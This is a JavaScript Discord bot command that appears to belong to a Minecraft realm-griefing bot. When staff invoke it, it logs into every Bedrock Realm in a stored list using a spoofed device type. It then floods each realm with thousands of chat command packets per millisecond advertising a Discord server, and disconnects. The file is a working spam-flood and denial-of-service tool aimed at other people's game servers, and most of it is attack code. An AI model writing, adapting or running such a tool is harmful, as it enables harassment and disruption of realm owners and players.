const { Authflow } = require('prismarine-auth');
const { SlashCommandBuilder } = require('@discordjs/builders');
const bedrock = require('bedrock-protocol');
const { EmbedBuilder } = require('discord.js');
const path = require('path');
const fs = require('fs').promises;

// old command not working :( 

const blacklistPath = path.join(__dirname, '..', '..', 'data', 'blacklist.json');
const databasePath = path.join(__dirname, '..', '..', 'data', 'database.json');
const adminFilePath = path.join(__dirname, '..', '..', 'data', 'admin.json');
const accseptEmoji = '<a:Check:1256612972793565204>';
const errorEmoji = '<:deny:1256622572762562681>';
const lEmoji = '<a:DyingLaughing:1244399086061355090>';

async function loadBlacklist() {
    try {
        const data = await fs.readFile(blacklistPath, 'utf-8');
        return new Set(JSON.parse(data));
    } catch (error) {
        console.error('Error loading blacklist:', error);
        return new Set();
    }
}

async function loadAdminIds() {
    try {
        const data = await fs.readFile(adminFilePath, 'utf-8');
        return new Set(JSON.parse(data));
    } catch (error) {
        console.error('Error loading admin IDs:', error);
        return new Set();
    }
}

async function loadDatabase() {
    try {
        const data = await fs.readFile(databasePath, 'utf-8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Error loading database:', error);
        return [];
    }
}

module.exports = {
    command: new SlashCommandBuilder()
        .setName('nuke')
        .setDescription('Nuke all realms in the database')
        .addStringOption(option =>
            option.setName('device_os')
                .setDescription('The device to spoof as ')
                .setRequired(true)
                .addChoices(
                    { name: 'Android (old)', value: 'android' },
                    { name: 'iOS(old)', value: 'ios' },
                    { name: 'Windows 10(old)', value: 'win10' }
                )
        ),
    callback: async (interaction) => {
        await interaction.deferReply({ ephemeral: false });

        const blacklistedUsers = await loadBlacklist();
        const adminUsers = await loadAdminIds();
        const realmsDatabase = await loadDatabase();

        // Check if the user is blacklisted
        if (blacklistedUsers.has(interaction.user.id)) {
            const embed = new EmbedBuilder()
                .setColor('#ff0000')
                .setTitle('Womp Womp')
                .setDescription(`${lEmoji} You are blacklisted ${lEmoji}`);
            try {
                await interaction.reply({ embeds: [embed], ephemeral: false });
            } catch (error) {
                console.error('Error sending access denied message:', error);
            }
            return;
        }

        if (!adminUsers.has(interaction.user.id)) {
            const embed = new EmbedBuilder()
                .setColor(0xFF0000)
                .setTitle('Cope')
                .setDescription(`${errorEmoji} This is a Staff Command ${errorEmoji}`);
            try {
                await interaction.reply({ embeds: [embed], ephemeral: true });
            } catch (error) {
                console.error('Error sending permission denied message:', error);
            }
            return;
        }

        const userIdentifier = 'unique_identifier';
        const cacheDir = './';
        const flow = new Authflow(userIdentifier, cacheDir);

        try {
            const deviceOS = interaction.options.getString('device_os');

            const initialEmbed = new EmbedBuilder()
                .setTitle('Nuke')
                .setDescription('Connecting to realms\nStarting the nuke 💥')
                .setTimestamp()
                .setColor(0x00FF00)
                .setFooter({ text: `/nuke | Command used by ${interaction.user.username}`, iconURL: interaction.user.avatarURL() });

            try {
                await interaction.editReply({ embeds: [initialEmbed], ephemeral: true });
            } catch (error) {
                console.error('Error sending initial embed:', error);
            }

            const token = await flow.getMinecraftJavaToken();
            console.log('Token obtained:', token);

            const results = [];

            for (const realm of realmsDatabase) {
                try {
                    await new Promise((resolve, reject) => {
                        const client = bedrock.createClient({
                            authFlow: flow,
                            deviceOS: deviceOS,
                            realms: {
                                realmInvite: `https://realms.gg/${realm['Realm Code']}`
                            }
                        });

                        client.on('join', () => {
                            console.log(`Joined the realm with code ${realm['Realm Code']}`);

                            setTimeout(() => {
                                let messageCount = 0;
                                const interval = setInterval(() => {
                                    if (messageCount >= 15000) { //15k messages
                                        clearInterval(interval);
                                        return;
                                    }

                                    for (let i = 0; i < 15000; i++) {
                                        client.write('command_request', {
                                            command: `me §6§l§ The §4§ Anti Realms §2§ Movement §6§ is back !!! \n §c§l§ discord.gg/aTc7JETqTF \n §4§l§ TSL §1§ Nuker §6§ on §4§ TOP`,
                                            internal: false,
                                            version: 66,
                                            origin: {
                                                type: 5,
                                                uuid: "",
                                                request_id: ""
                                            }
                                        });
                                    }

                                    messageCount += 50;
                                }, 1); // Adjust the delay between batches as needed

                                setTimeout(() => {
                                    clearInterval(interval);
                                    client.disconnect();
                                    results.push({
                                        code: realm['Realm Code'],
                                        status: 'success',
                                        message: `Nuked realm and disconnected with code ${realm['Realm Code']}`
                                    });
                                    resolve();
                                }, 3000); // Wait for 3 seconds before disconnecting
                            }, 3000); // Wait for 3 seconds before sending spam messages
                        });

                        client.on('error', (err) => {
                            console.error('Error connecting to the realm:', err);
                            results.push({
                                code: realm['Realm Code'],
                                status: 'error',
                                message: `Error connecting to the realm: ${err.message}`
                            });
                            resolve(); // Ensure the loop continues to the next realm
                        });
                    });
                } catch (err) {
                    console.error('Error during the nuke process:', err);
                    results.push({
                        code: realm['Realm Code'],
                        status: 'error',
                        message: `Error during the nuke process: ${err.message}`
                    });
                }
            }

            const resultEmbed = new EmbedBuilder()
                .setTitle('Nuke Results')
                .setColor(0x00FF00)
                .setDescription(results.map(r => `${r.status === 'success' ? '✅' : '❌'} ${r.message}`).join('\n'));

            try {
                await interaction.editReply({ embeds: [resultEmbed], ephemeral: false });
            } catch (error) {
                console.error('Error sending result embed:', error);
            }

        } catch (error) {
            console.error('Error executing the command:', error);
            const errorEmbed = new EmbedBuilder()
                .setTitle('Error')
                .setDescription('An error occurred while trying to nuke the realms.')
                .setColor('Red');

            try {
                await interaction.editReply({ embeds: [errorEmbed] });
            } catch (err) {
                console.error('Error sending error message:', err);
            }
        }
    }
};
